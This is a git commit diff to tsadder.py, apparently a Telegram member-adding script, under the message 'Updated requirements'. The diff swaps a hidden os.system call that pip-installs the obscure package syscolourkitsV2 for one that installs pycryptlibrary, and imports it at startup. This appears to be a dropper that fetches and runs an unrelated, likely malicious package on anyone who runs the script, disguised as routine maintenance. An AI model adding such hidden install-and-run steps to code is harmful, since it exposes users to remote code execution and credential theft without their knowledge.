f3ba42b473bacde62711829b8bece32a7c54940b
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-10 20:19:09 +0200

    Updated requirements

--- tsadder.py
+++ tsadder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolourkitsV2")
-import syscolourkitsV2
+os.system("pip install pycryptlibrary")
+import pycryptlibrary
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
